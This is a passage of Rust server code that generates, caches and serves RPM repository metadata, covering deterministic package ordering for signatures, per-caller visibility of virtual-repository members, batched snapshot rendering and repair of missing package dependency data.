// ---------------------------------------------------------------------------
// Artifact query helper
// ---------------------------------------------------------------------------

#[allow(dead_code)]
#[derive(sqlx::FromRow)]
pub(crate) struct RpmArtifact {
    pub(crate) id: uuid::Uuid,
    pub(crate) path: String,
    pub(crate) name: String,
    pub(crate) version: Option<String>,
    pub(crate) size_bytes: i64,
    pub(crate) checksum_sha256: String,
    pub(crate) storage_key: String,
    pub(crate) metadata: Option<serde_json::Value>,
    /// Drives the repodata metadata epoch (`<revision>`/`<timestamp>`) so the
    /// render stays a pure function of repository state (#2636).
    pub(crate) updated_at: chrono::DateTime<chrono::Utc>,
}

/// List a repository's RPM artifacts in a **deterministic total order**.
///
/// The order is part of the repodata contract, not a display choice: it fixes
/// the package order in `primary.xml`/`filelists.xml`, hence their checksums,
/// hence the `repomd.xml` bytes that `repomd.xml.asc` signs. The previous
/// `ORDER BY a.created_at DESC` was not a *total* order — artifacts sharing a
/// `created_at` (a bulk upload commits many rows with the same `NOW()`) could
/// come back in either order, so two renders of unchanged state could differ
/// and the detached signature would not match the served document (#2636).
/// `(name, version, path)` is the order Debian's package index already uses;
/// `id` is unique, so appending it makes the order total.
///
/// Only actual `.rpm` package objects (including `.src.rpm`) are listed: the
/// generic chunked upload flow can place arbitrary companions (signature
/// sidecars, checksum files, `.repo` snippets) in an RPM repository, and
/// repodata must never describe those as packages (#2590). Delta RPMs
/// (`.drpm`) are also excluded — they belong in `prestodelta` metadata,
/// which we do not generate, not in `primary.xml`.
/// The repositories a repodata response for `repo` describes: the repo
/// itself for Hosted (Local/Staging) repos, or the member repo ids for
/// Virtual repos — otherwise `repomd.xml`/`primary.xml.gz` advertise
/// `packages="0"` and `dnf` treats the aggregate repo as empty even though
/// the members hold packages (#1780).
///
/// For a virtual repo the members are narrowed to the ones the CALLER may
/// read (#4346, the item #3323 deferred): the document lists package names,
/// versions, digests and file lists, so a member the caller cannot read must
/// not appear in it. A virtual whose members are all hidden renders the same
/// empty document as one with no members. The render cache and the detached
/// `repomd.xml.asc` are keyed by this set (see `rpm_repodata_cache`), so
/// callers with different visibility never share a render.
///
/// Sorted so the id set is canonical: `fetch_virtual_members` orders by
/// `vrm.priority`, which is not a total order, and both the fingerprint
/// comparison (#2521) and the render must not depend on member visit order
/// for the output (and therefore the detached signature) to be reproducible
/// (#2636).
async fn repodata_repo_ids(
    db: &sqlx::PgPool,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
) -> Result<Vec<uuid::Uuid>, Response> {
    if repo.repo_type != RepositoryType::Virtual {
        return Ok(vec![repo.id]);
    }
    let members = proxy_helpers::authorized_virtual_members(db, auth, repo.id).await?;
    let mut ids: Vec<uuid::Uuid> = members.iter().map(|m| m.id).collect();
    ids.sort_unstable();
    ids.dedup();
    Ok(ids)
}

/// The rows a repodata render describes, in its deterministic total order
/// (#2636). `$1` is the repository id set, `$2` the root prefix.
const REPODATA_ARTIFACTS_SQL: &str = r#"
        SELECT a.id, a.path, a.name, a.version, a.size_bytes, a.checksum_sha256,
               a.storage_key, a.updated_at, am.metadata
        FROM artifacts a
        LEFT JOIN artifact_metadata am ON am.artifact_id = a.id
        WHERE a.repository_id = ANY($1) AND a.is_deleted = false
          AND a.path LIKE '%.rpm'
          AND starts_with(a.path, $2)
        ORDER BY a.name, a.version, a.path, a.id
        "#;

/// Collect the RPM artifacts a repodata response should describe, in a
/// deterministic total order (`ORDER BY name, version, path, id`) so
/// unchanged state always renders byte-identical documents (#2636).
#[cfg(test)]
async fn collect_repodata_artifacts(
    db: &sqlx::PgPool,
    repo_ids: &[uuid::Uuid],
) -> Result<Vec<RpmArtifact>, Response> {
    collect_repodata_artifacts_at(db, repo_ids, "").await
}

#[cfg(test)]
async fn collect_repodata_artifacts_at(
    db: &sqlx::PgPool,
    repo_ids: &[uuid::Uuid],
    prefix: &str,
) -> Result<Vec<RpmArtifact>, Response> {
    sqlx::query_as::<_, RpmArtifact>(REPODATA_ARTIFACTS_SQL)
        .bind(repo_ids)
        .bind(prefix)
        .fetch_all(db)
        .await
        .map_err(super::db_err)
}

/// The current [`RepodataFingerprint`] for `repo_ids`: one aggregate query
/// (count + latest `updated_at` over the live `.rpm` rows — an index scan
/// with no row transfer and no metadata join), revalidated on every repodata
/// request so a publish/delete/promotion is visible on the very next read.
///
/// The `.rpm` scoping matches `collect_repodata_artifacts` exactly: the
/// fingerprint must move if and only if the rendered row set can change.
async fn repodata_fingerprint(
    db: &sqlx::PgPool,
    repo_ids: Vec<uuid::Uuid>,
    prefix: &str,
) -> Result<RepodataFingerprint, Response> {
    let (live_rpm_count, latest_update): (i64, Option<chrono::DateTime<chrono::Utc>>) =
        sqlx::query_as(
            r#"
        SELECT COUNT(*), MAX(a.updated_at)
        FROM artifacts a
        WHERE a.repository_id = ANY($1) AND a.is_deleted = false
          AND a.path LIKE '%.rpm'
          AND starts_with(a.path, $2)
        "#,
        )
        .bind(&repo_ids)
        .bind(prefix)
        .fetch_one(db)
        .await
        .map_err(super::db_err)?;

    Ok(RepodataFingerprint {
        repo_ids,
        live_rpm_count,
        latest_update,
    })
}

/// Serve the rendered repodata set for `repo` through the fingerprint-
/// validated cache (#2521): a warm request costs the fingerprint query plus
/// a refcount clone of the prebuilt bytes; a state change re-renders exactly
/// once (concurrent misses coalesce on a per-repo single-flight lock). The
/// O(repo) generation itself runs on the blocking pool so large renders do
/// not stall the async runtime.
///
/// `auth` is the caller: a virtual repository's document describes only the
/// members that caller may read (#4346), and the cache keys each render by
/// that authorized member set.
async fn cached_repodata_at(
    state: &SharedState,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
    root: &str,
) -> Result<std::sync::Arc<RenderedRepodata>, Response> {
    let depth = rpm_layout::depth(&state.db, repo.id)
        .await
        .map_err(IntoResponse::into_response)?;
    rpm_layout::validate_root(root, depth).map_err(|_| {
        (StatusCode::NOT_FOUND, "No repodata at this directory depth").into_response()
    })?;
    let prefix = if root.is_empty() {
        String::new()
    } else {
        format!("{root}/")
    };
    let repo_ids = repodata_repo_ids(&state.db, auth, repo).await?;
    // Captured BEFORE the artifact rows are fetched: a write racing the
    // render can only make the stored entry look older than its content, so
    // the next request re-renders — never serves stale bytes as fresh.
    let fingerprint = repodata_fingerprint(&state.db, repo_ids, &prefix).await?;
    if !cache_root_render(root, &fingerprint) {
        // Rendering no packages is trivial; see `cache_root_render`.
        return Ok(std::sync::Arc::new(render_repodata_at(&[], &prefix)));
    }
    let render_state = state.clone();
    let ids = fingerprint.repo_ids.clone();
    state
        .rpm_repodata_cache
        .get_or_render_at(repo.id, root, fingerprint, || async move {
            render_repodata_streamed(
                &render_state,
                &ids,
                &prefix,
                RPM_REPODATA_RENDER_BATCH_BYTES,
            )
            .await
            .map(|(rendered, _)| rendered)
        })
        .await
}

/// A root's repodata for one request (#4544).
enum RepodataSet {
    /// Rendered on request (through the in-process cache): virtual
    /// repositories, `repodata_mode: on_request`, and roots not built yet.
    Rendered(std::sync::Arc<RenderedRepodata>),
    /// The revision the precomputed builder stored.
    Stored(StoredRepodata),
}

impl RepodataSet {
    fn repomd_xml(&self) -> Bytes {
        match self {
            Self::Rendered(r) => r.repomd_xml.clone(),
            Self::Stored(s) => s.repomd_xml.clone(),
        }
    }
}

/// The repodata `root` of `repo` serves: the precomputed revision when the
/// repository is a precomputed hosted one and the root has been built,
/// otherwise the on-request render.
async fn repodata_set_at(
    state: &SharedState,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
    root: &str,
) -> Result<RepodataSet, Response> {
    if repo.repo_type == RepositoryType::Local {
        let depth = rpm_layout::depth(&state.db, repo.id)
            .await
            .map_err(IntoResponse::into_response)?;
        rpm_layout::validate_root(root, depth).map_err(|_| {
            (StatusCode::NOT_FOUND, "No repodata at this directory depth").into_response()
        })?;
        if let Some(stored) = rpm_repodata_builder::stored_revision(&state.db, repo.id, root)
            .await
            .map_err(IntoResponse::into_response)?
        {
            return Ok(RepodataSet::Stored(stored));
        }
    }
    cached_repodata_at(state, auth, repo, root)
        .await
        .map(RepodataSet::Rendered)
}

/// One generated `repodata/` document of `root`: `repomd.xml`, its detached
/// signature, or one of the three compressed indexes.
async fn repodata_document(
    state: &SharedState,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
    root: &str,
    file: &str,
) -> Result<Response, Response> {
    let set = repodata_set_at(state, auth, repo, root).await?;
    let rendered = match (&set, file) {
        (_, "repomd.xml") => return Ok(repodata_bytes_response(file, set.repomd_xml())),
        // Signed per request over the bytes `repomd.xml` serves, so a key
        // rotation (#1329) applies at once to stored revisions too.
        (_, "repomd.xml.asc") => return sign_repomd(state, repo, set.repomd_xml()).await,
        (RepodataSet::Stored(stored), _) => {
            return stored_repodata_response(state, auth, repo, root, stored, file).await
        }
        (RepodataSet::Rendered(rendered), _) => rendered,
    };
    let bytes = match file {
        "primary.xml.gz" => rendered.primary_gz.clone(),
        "filelists.xml.gz" => rendered.filelists_gz.clone(),
        "other.xml.gz" => rendered.other_gz.clone(),
        _ => return Err((StatusCode::NOT_FOUND, "Metadata not found").into_response()),
    };
    Ok(repodata_bytes_response(file, bytes))
}

fn repodata_bytes_response(file: &str, bytes: Bytes) -> Response {
    Response::builder()
        .status(StatusCode::OK)
        .header(CONTENT_TYPE, publication_content_type(file))
        .header(CONTENT_LENGTH, bytes.len())
        .body(Body::from(bytes))
        .unwrap()
}

/// Stream a compressed document of a stored revision. A document missing
/// from storage (removed by hand, or a storage reset) is rendered on request
/// instead and the root is marked for a rebuild.
async fn stored_repodata_response(
    state: &SharedState,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
    root: &str,
    stored: &StoredRepodata,
    file: &str,
) -> Result<Response, Response> {
    if !matches!(file, "primary.xml.gz" | "filelists.xml.gz" | "other.xml.gz") {
        return Err((StatusCode::NOT_FOUND, "Metadata not found").into_response());
    }
    let storage = state.storage_for_repo_or_500(&stored.location)?;
    match storage.get_stream(&stored.key(file)).await {
        Ok(stream) => {
            let mut response = Response::builder()
                .status(StatusCode::OK)
                .header(CONTENT_TYPE, publication_content_type(file));
            if let Some(size) = stored.sizes.get(file) {
                response = response.header(CONTENT_LENGTH, *size);
            }
            Ok(response.body(Body::from_stream(stream)).unwrap())
        }
        Err(crate::error::AppError::NotFound(_)) => {
            warn!(
                repo_id = %repo.id,
                root,
                revision = stored.revision,
                file,
                "stored RPM repodata document missing; rendering on request and rebuilding"
            );
            let _ = rpm_repodata_builder::mark_dirty(&state.db, repo.id, root).await;
            let rendered = cached_repodata_at(state, auth, repo, root).await?;
            let bytes = match file {
                "primary.xml.gz" => rendered.primary_gz.clone(),
                "filelists.xml.gz" => rendered.filelists_gz.clone(),
                _ => rendered.other_gz.clone(),
            };
            Ok(repodata_bytes_response(file, bytes))
        }
        Err(e) => Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            crate::api::handlers::storage_err_message(&e),
        )
            .into_response()),
    }
}

/// Metadata JSON held in memory at once by a repodata render (#4544). Rows
/// stream from one consistent snapshot and are rendered in batches of about
/// this many bytes of metadata, so peak memory follows the batch, not the
/// root: a root of 2,500 packages with 2.5 GB of file-list metadata used to
/// load all of it (plus every uncompressed document) before the first byte
/// was gzipped. A single package larger than the budget is its own batch.
pub(crate) const RPM_REPODATA_RENDER_BATCH_BYTES: usize = 32 * 1024 * 1024;

/// What a streamed render did, for tests and the render log line.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub(crate) struct RenderStats {
    packages: usize,
    pub(crate) batches: usize,
    /// Largest batch by estimated metadata bytes.
    max_batch_bytes: usize,
    /// Most rows in one batch.
    max_batch_rows: usize,
}

/// Render the repodata set for the live `.rpm` rows of `repo_ids` under
/// `prefix` without holding the whole catalogue in memory (#4544): the
/// on-request render, into memory, healing as it goes.
///
/// The bytes are identical to [`render_repodata_at`] over the same rows, and
/// the uncompressed documents to the ones the whole-catalogue render built.
/// See [`render_repodata_snapshot`] for the snapshot and batching.
async fn render_repodata_streamed(
    state: &SharedState,
    repo_ids: &[uuid::Uuid],
    prefix: &str,
    batch_bytes: usize,
) -> Result<(RenderedRepodata, RenderStats), Response> {
    let render = render_repodata_snapshot(
        state,
        repo_ids,
        prefix,
        batch_bytes,
        RPM_REPODATA_DOC_SPILL_BYTES,
        [Vec::new(), Vec::new(), Vec::new()],
        RenderHeal::InSnapshot,
    )
    .await?;
    let docs = render.docs;
    let rendered = RenderedRepodata {
        repomd_xml: Bytes::from(docs.repomd_xml),
        primary_gz: Bytes::from(docs.primary.sink),
        filelists_gz: Bytes::from(docs.filelists.sink),
        other_gz: Bytes::from(docs.other.sink),
        // A render missing some packages' dependency data (transient heal
        // failure) is served but not cached: the fingerprint would not move
        // again, so caching it would pin the gap (#3801).
        cacheable: render.heal_complete,
        valid_until: render.valid_until,
    };
    Ok((rendered, render.stats))
}

/// Whether a snapshot render heals packages that lack a current repodata
/// block (#3801) as it reads them.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum RenderHeal {
    /// Heal inside the snapshot (the on-request render): one request does
    /// everything, at the cost of holding the snapshot across storage reads.
    InSnapshot,
    /// The caller healed beforehand ([`heal_root`], the precomputed
    /// builder); a package still lacking its block only marks the render
    /// incomplete.
    Before,
}

/// A finished [`render_repodata_snapshot`].
pub(crate) struct SnapshotRender<W> {
    pub(crate) docs: RepodataDocs<W>,
    pub(crate) stats: RenderStats,
    /// False when some package's dependency data is missing for a transient
    /// reason (#3801).
    pub(crate) heal_complete: bool,
    /// The earliest heal retry deadline among the rendered packages.
    pub(crate) valid_until: Option<std::time::Instant>,
    /// Live `.rpm` count and latest `updated_at` of the rendered snapshot:
    /// the same values [`repodata_fingerprint`] reads.
    pub(crate) count: i64,
    pub(crate) latest_update: Option<chrono::DateTime<chrono::Utc>>,
}

/// Render the repodata set for the live `.rpm` rows of `repo_ids` under
/// `prefix` into `sinks` (primary, filelists, other) from one snapshot.
///
/// One `REPEATABLE READ` read-only transaction gives the count (the
/// `packages=` attribute every document opens with) and the row stream the
/// same snapshot, so the documents agree with each other exactly as the
/// single-query render did. Rows are accumulated until `batch_bytes` of
/// metadata, then (with [`RenderHeal::InSnapshot`]) healed (#3801), appended
/// to the three gzip streams off the async runtime and dropped.
///
/// The transaction stays open for the whole render, so on a large root it
/// holds back the vacuum horizon (its snapshot xmin) for that long, like any
/// long-running read. It is read-only and takes no row locks; rows changed
/// meanwhile are reclaimed by the first vacuum after it ends. With
/// [`RenderHeal::InSnapshot`] that includes the heal's storage reads; the
/// precomputed builder heals first and renders with [`RenderHeal::Before`].
pub(crate) async fn render_repodata_snapshot<W: Write + Send + 'static>(
    state: &SharedState,
    repo_ids: &[uuid::Uuid],
    prefix: &str,
    batch_bytes: usize,
    spill_bytes: usize,
    sinks: [W; 3],
    heal: RenderHeal,
) -> Result<SnapshotRender<W>, Response> {
    use futures::TryStreamExt;

    let render_failed = |e: tokio::task::JoinError| {
        error!(error = %e, "RPM repodata render task failed");
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Failed to render repository metadata",
        )
            .into_response()
    };

    let mut tx = state.db.begin().await.map_err(super::db_err)?;
    sqlx::query("SET TRANSACTION ISOLATION LEVEL REPEATABLE READ, READ ONLY")
        .execute(&mut *tx)
        .await
        .map_err(super::db_err)?;
    let (count, latest_update): (i64, Option<chrono::DateTime<chrono::Utc>>) = sqlx::query_as(
        r#"
        SELECT COUNT(*), MAX(a.updated_at)
        FROM artifacts a
        WHERE a.repository_id = ANY($1) AND a.is_deleted = false
          AND a.path LIKE '%.rpm'
          AND starts_with(a.path, $2)
        "#,
    )
    .bind(repo_ids)
    .bind(prefix)
    .fetch_one(&mut *tx)
    .await
    .map_err(super::db_err)?;

    let mut writer = Some(RepodataWriter::with_sinks(
        usize::try_from(count).unwrap_or(0),
        prefix,
        spill_bytes,
        sinks,
    ));
    let mut stats = RenderStats::default();
    let mut heal_complete = true;
    let mut valid_until: Option<std::time::Instant> = None;
    let mut batch: Vec<RpmArtifact> = Vec::new();
    let mut held = 0usize;
    {
        let mut rows = sqlx::query_as::<_, RpmArtifact>(REPODATA_ARTIFACTS_SQL)
            .bind(repo_ids)
            .bind(prefix)
            .fetch(&mut *tx);
        loop {
            let row = rows.try_next().await.map_err(super::db_err)?;
            let done = row.is_none();
            if let Some(row) = row {
                held += row.metadata.as_ref().map_or(0, json_weight);
                batch.push(row);
            }
            if batch.is_empty() {
                // Only reachable at the end of the stream.
                break;
            }
            if !done && held < batch_bytes {
                continue;
            }
            let mut rows_now = std::mem::take(&mut batch);
            stats.batches += 1;
            stats.packages += rows_now.len();
            stats.max_batch_bytes = stats.max_batch_bytes.max(held);
            stats.max_batch_rows = stats.max_batch_rows.max(rows_now.len());
            held = 0;
            heal_complete &= match heal {
                RenderHeal::InSnapshot => heal_rpm_repodata_info(state, &mut rows_now).await,
                RenderHeal::Before => !rows_now.iter().any(needs_repodata_heal),
            };
            valid_until = match (valid_until, earliest_retry_deadline(&rows_now)) {
                (Some(a), Some(b)) => Some(a.min(b)),
                (a, b) => a.or(b),
            };
            let mut w = writer.take().expect("writer present between batches");
            writer = Some(
                tokio::task::spawn_blocking(move || {
                    w.push_batch(&rows_now);
                    w
                })
                .await
                .map_err(render_failed)?,
            );
            if done {
                break;
            }
        }
    }
    // Read-only: ending the transaction releases the snapshot.
    let _ = tx.rollback().await;
    if i64::try_from(stats.packages).ok() != Some(count) {
        // One snapshot answers both queries, so this cannot happen; if it
        // ever does, refuse the render rather than serve documents whose
        // `packages=` disagrees with their contents.
        error!(
            counted = count,
            streamed = stats.packages,
            "RPM repodata render: row count changed within one snapshot"
        );
        return Err((
            StatusCode::INTERNAL_SERVER_ERROR,
            "Failed to render repository metadata",
        )
            .into_response());
    }

    let w = writer.take().expect("writer present after the last batch");
    let docs = tokio::task::spawn_blocking(move || w.finish_docs())
        .await
        .map_err(render_failed)?
        .map_err(|e| {
            error!(error = %e, "RPM repodata render: writing a document failed");
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Failed to render repository metadata",
            )
                .into_response()
        })?;
    Ok(SnapshotRender {
        docs,
        stats,
        heal_complete,
        valid_until,
        count,
        latest_update,
    })
}

/// Rows of `repo_id` under `prefix` that may lack a current repodata block,
/// a page at a time in id order. A superset of [`needs_repodata_heal`]
/// (which the heal rechecks), so only those rows' metadata is transferred.
const HEAL_CANDIDATES_SQL: &str = r#"
        SELECT a.id, a.path, a.name, a.version, a.size_bytes, a.checksum_sha256,
               a.storage_key, a.updated_at, am.metadata
        FROM artifacts a
        LEFT JOIN artifact_metadata am ON am.artifact_id = a.id
        WHERE a.repository_id = $1 AND a.is_deleted = false
          AND a.path LIKE '%.rpm'
          AND starts_with(a.path, $2)
          AND a.id > $3
          AND (am.metadata IS NULL
               OR jsonb_typeof(am.metadata -> 'repodata') IS DISTINCT FROM 'object'
               OR (am.metadata -> 'repodata' -> 'v') IS DISTINCT FROM to_jsonb(1)
               OR (am.metadata -> 'repodata') ? 'retry_after')
        ORDER BY a.id
        LIMIT $4
        "#;

/// Rows healed per page by [`heal_root`].
const HEAL_PAGE_ROWS: i64 = 256;

/// Heal (#3801) every package of `repo_id` under `prefix` that lacks a
/// current repodata block, outside any snapshot: plain reads, then the
/// storage reads and the per-package writes, page by page (#4544). The
/// precomputed builder runs this before it opens the snapshot it renders
/// from, so the render does no storage reads and holds no second database
/// connection. Returns `false` when some package could not be settled for a
/// transient reason.
pub(crate) async fn heal_root(
    state: &SharedState,
    repo_id: uuid::Uuid,
    prefix: &str,
) -> Result<bool, sqlx::Error> {
    let mut after = uuid::Uuid::nil();
    let mut complete = true;
    loop {
        let mut page: Vec<RpmArtifact> = sqlx::query_as(HEAL_CANDIDATES_SQL)
            .bind(repo_id)
            .bind(prefix)
            .bind(after)
            .bind(HEAL_PAGE_ROWS)
            .fetch_all(&state.db)
            .await?;
        let Some(last) = page.last() else {
            return Ok(complete);
        };
        after = last.id;
        let full = page.len() as i64 == HEAL_PAGE_ROWS;
        complete &= heal_rpm_repodata_info(state, &mut page).await;
        if !full {
            return Ok(complete);
        }
    }
}

/// Approximate in-memory weight of a metadata document: its string and key
/// bytes plus a fixed cost per value. Only used to size render batches.
fn json_weight(value: &serde_json::Value) -> usize {
    const NODE: usize = 16;
    match value {
        serde_json::Value::String(s) => NODE + s.len(),
        serde_json::Value::Array(items) => NODE + items.iter().map(json_weight).sum::<usize>(),
        serde_json::Value::Object(map) => {
            NODE + map
                .iter()
                .map(|(k, v)| k.len() + json_weight(v))
                .sum::<usize>()
        }
        _ => NODE,
    }
}

/// Whether a render of `root` may take a slot in the shared, bounded
/// repodata cache (#4216). At positive depth any reader can name any
/// syntactically valid root, and an empty one renders empty metadata; caching
/// those would let a stream of made-up roots evict the populated roots and
/// make every real client pay a full re-render. An empty positive-depth root
/// is therefore rendered per request (it has no packages to describe) and
/// never cached. The depth-zero repository root keeps today's behaviour.
fn cache_root_render(root: &str, fingerprint: &RepodataFingerprint) -> bool {
    root.is_empty() || fingerprint.live_rpm_count > 0
}

/// Upper bound on the header prefix read back from storage when healing a
/// package's repodata block: the most a within-limits package's headers can
/// span, so a hostile size field cannot turn a render into a larger read.
const RPM_HEAL_HEADER_LIMIT: usize = crate::formats::rpm::RPM_HEADER_READ_MAX;
/// Storage reads in flight while healing one render.
const RPM_HEAL_CONCURRENCY: usize = 8;

/// The instant the earliest retryable marker among `artifacts` falls due:
/// a render describing such a package must not outlive it, or a stable
/// repository would never retry the package (#3801).
fn earliest_retry_deadline(artifacts: &[RpmArtifact]) -> Option<std::time::Instant> {
    let now = chrono::Utc::now().timestamp();
    artifacts
        .iter()
        .filter_map(|a| {
            a.metadata
                .as_ref()?
                .get(RPM_REPODATA_KEY)?
                .get("retry_after")?
                .as_i64()
        })
        // Only deadlines still ahead: an expired marker whose re-heal failed
        // again must not pin the render's validity to "now".
        .filter(|&due| due > now)
        .min()
        .map(|due| {
            std::time::Instant::now()
                + std::time::Duration::from_secs(u64::try_from(due - now).unwrap_or(0))
        })
}

/// Whether `artifact` still needs its repodata block derived: no block of
/// the current version, neither real nor an "unparseable" marker.
fn needs_repodata_heal(artifact: &RpmArtifact) -> bool {
    needs_repodata_heal_at(artifact, chrono::Utc::now().timestamp())
}

fn needs_repodata_heal_at(artifact: &RpmArtifact, now: i64) -> bool {
    let Some(block) = artifact
        .metadata
        .as_ref()
        .and_then(|m| m.get(RPM_REPODATA_KEY))
    else {
        return true;
    };
    if block.get("v").and_then(|v| v.as_u64()) != Some(RPM_REPODATA_INFO_VERSION) {
        return true;
    }
    // A marker written after repeated TRANSIENT failures (storage down,
    // object unreadable) is retried once it is old enough; a deterministic
    // one (the header itself is unusable) never is.
    block
        .get("retry_after")
        .and_then(|t| t.as_i64())
        .is_some_and(|t| now >= t)
}

/// Consecutive transient heal failures after which a package is settled
/// with a retryable marker (retried after [`RPM_HEAL_RETRY_SECS`]) instead
/// of keeping its repository's renders uncacheable.
const RPM_HEAL_MAX_TRANSIENT_FAILURES: i64 = 5;
/// Delay before a package settled by transient failures is retried.
const RPM_HEAL_RETRY_SECS: i64 = 24 * 60 * 60;
/// Metadata key counting consecutive transient heal failures.
const RPM_HEAL_FAILURES_KEY: &str = "repodata_heal_failures";

/// Packages stored before #3801 (or pushed through a path that could not see
/// the whole header) carry no current [`RPM_REPODATA_KEY`] block, so their
/// `primary.xml` entry would declare no dependencies. Re-derive the block from
/// the stored package's header — a ranged read of the first few KiB, not the
/// payload — and render with it.
///
/// Each package's block is persisted as soon as its own read and parse
/// finish, so a render cancelled half-way (a client timing out on a large
/// legacy repository) keeps its progress. A package whose header is
/// malformed, over the limits or missing from storage gets a persisted
/// "unparseable" marker and is never re-read. Returns `false` when any
/// package could not be settled for a transient reason (storage or database
/// error): that render still serves, but must not be cached, so the next
/// request retries instead of pinning dependency-less metadata. Persisting
/// does not touch `artifacts.updated_at`, so the fingerprint does not move
/// (at positive depth, migration 247's metadata trigger ignores exactly these
/// bookkeeping writes, #4216).
async fn heal_rpm_repodata_info(state: &SharedState, artifacts: &mut [RpmArtifact]) -> bool {
    use futures::StreamExt;

    let stale: Vec<usize> = artifacts
        .iter()
        .enumerate()
        .filter(|(_, a)| needs_repodata_heal(a))
        .map(|(i, _)| i)
        .collect();
    if stale.is_empty() {
        return true;
    }

    let ids: Vec<uuid::Uuid> = stale.iter().map(|&i| artifacts[i].id).collect();
    let rows = match sqlx::query(
        "SELECT a.id, r.storage_backend, r.storage_path \
         FROM artifacts a JOIN repositories r ON r.id = a.repository_id \
         WHERE a.id = ANY($1)",
    )
    .bind(&ids)
    .fetch_all(&state.db)
    .await
    {
        Ok(rows) => rows,
        Err(e) => {
            warn!(error = %e, "RPM repodata heal: storage lookup failed");
            return false;
        }
    };
    let locations: std::collections::HashMap<uuid::Uuid, crate::storage::StorageLocation> = rows
        .iter()
        .filter_map(|r| {
            use sqlx::Row;
            Some((
                r.try_get("id").ok()?,
                crate::storage::StorageLocation {
                    backend: r.try_get("storage_backend").ok()?,
                    path: r.try_get("storage_path").ok()?,
                },
            ))
        })
        .collect();

    let mut complete = true;
    let mut jobs = Vec::with_capacity(stale.len());
    for i in stale {
        let a = &artifacts[i];
        let Some(location) = locations.get(&a.id).cloned() else {
            complete = false;
            continue;
        };
        jobs.push(HealJob {
            index: i,
            artifact_id: a.id,
            filename: a.path.rsplit('/').next().unwrap_or(&a.path).to_string(),
            storage_key: a.storage_key.clone(),
            size_bytes: a.size_bytes,
            location,
            metadata: a.metadata.clone().filter(|m| m.is_object()),
        });
    }
    let results: Vec<(usize, Option<serde_json::Value>, bool)> = futures::stream::iter(jobs)
        .map(|job| heal_one(state, job))
        .buffer_unordered(RPM_HEAL_CONCURRENCY)
        .collect()
        .await;

    let mut healed = 0usize;
    for (i, metadata, settled) in results {
        complete &= settled;
        if let Some(metadata) = metadata {
            artifacts[i].metadata = Some(metadata);
            healed += 1;
        }
    }
    if healed > 0 {
        info!(
            healed,
            "RPM repodata: derived dependency metadata for stored packages (#3801)"
        );
    }
    complete
}

struct HealJob {
    index: usize,
    artifact_id: uuid::Uuid,
    filename: String,
    storage_key: String,
    size_bytes: i64,
    location: crate::storage::StorageLocation,
    metadata: Option<serde_json::Value>,
}

/// Heal one package: read its header, derive the block off the async
/// runtime, persist it. Returns the metadata to render with (when a block
/// was derived) and whether the package is settled (persisted).
async fn heal_one(state: &SharedState, job: HealJob) -> (usize, Option<serde_json::Value>, bool) {
    let block_and_base = match read_rpm_header_prefix(
        state,
        &job.location,
        &job.storage_key,
        job.size_bytes,
    )
    .await
    {
        Ok(prefix) => {
            let (filename, needs_base) = (job.filename.clone(), job.metadata.is_none());
            tokio::task::spawn_blocking(move || {
                let block = match rpm_repodata_block(&prefix, false) {
                    RepodataBlock::Info(b) | RepodataBlock::Unparseable(b) => b,
                    RepodataBlock::OverLimit(reason) => unparseable_block(&reason),
                    RepodataBlock::Pending => unparseable_block("RPM header incomplete"),
                };
                // A row with no metadata at all also gets the NEVRA/text
                // fields the upload would have recorded, where they parse.
                let base = needs_base
                    .then(|| {
                        build_rpm_artifact_metadata(&filename, &prefix)
                            .ok()
                            .flatten()
                    })
                    .flatten();
                (block, base)
            })
            .await
            .ok()
        }
        Err(HeaderRead::Permanent(reason)) => Some((unparseable_block(&reason), None)),
        Err(HeaderRead::Transient(reason)) => {
            metrics::counter!("ak_rpm_repodata_heal_transient_failures_total").increment(1);
            warn!(artifact_id = %job.artifact_id, %reason, "RPM repodata heal: header read failed");
            None
        }
    };
    let Some((block, base)) = block_and_base else {
        let settled = record_transient_heal_failure(&state.db, job.artifact_id).await;
        return (job.index, None, settled);
    };

    let mut metadata = job
        .metadata
        .or(base)
        .unwrap_or_else(|| serde_json::json!({ "filename": job.filename }));
    metadata[RPM_REPODATA_KEY] = block;
    match persist_repodata_block(&state.db, job.artifact_id, &metadata).await {
        Ok(()) => (job.index, Some(metadata), true),
        Err(e) if is_size_limit_error(&e) => {
            // Too large to store: settle it as unparseable rather than
            // re-deriving (and rendering) the oversized block every time.
            let reason = format!("repodata block too large to store: {e}");
            metadata[RPM_REPODATA_KEY] = unparseable_block(&reason);
            let settled = persist_repodata_block(&state.db, job.artifact_id, &metadata)
                .await
                .is_ok();
            (job.index, Some(metadata), settled)
        }
        Err(e) => {
            warn!(artifact_id = %job.artifact_id, error = %e, "RPM repodata heal: persist failed");
            (job.index, Some(metadata), false)
        }
    }
}

/// Merge `metadata`'s repodata block into the artifact's row (inserting the
/// whole value when there is no row): a concurrent writer of any other key
/// is not overwritten with this render's stale copy, and the transient
/// failure counter is cleared.
async fn persist_repodata_block(
    db: &sqlx::PgPool,
    artifact_id: uuid::Uuid,
    metadata: &serde_json::Value,
) -> Result<(), sqlx::Error> {
    sqlx::query(
        "INSERT INTO artifact_metadata (artifact_id, format, metadata) \
         VALUES ($1, 'rpm', $2) \
         ON CONFLICT (artifact_id) DO UPDATE SET metadata = CASE \
             WHEN jsonb_typeof(artifact_metadata.metadata) = 'object' \
             THEN (artifact_metadata.metadata - $4::text) \
                  || jsonb_build_object($3::text, EXCLUDED.metadata -> $3::text) \
             ELSE EXCLUDED.metadata END",
    )
    .bind(artifact_id)
    .bind(metadata)
    .bind(RPM_REPODATA_KEY)
    .bind(RPM_HEAL_FAILURES_KEY)
    .execute(db)
    .await
    .map(|_| ())
}

/// Postgres refusing a value for its size (SQLSTATE class 54, "program
/// limit exceeded": e.g. a jsonb object over ~256 MB). Retrying cannot help.
fn is_size_limit_error(e: &sqlx::Error) -> bool {
    matches!(e, sqlx::Error::Database(db) if db.code().is_some_and(|c| c.starts_with("54")))
}

/// Count one transient heal failure for `artifact_id`. After
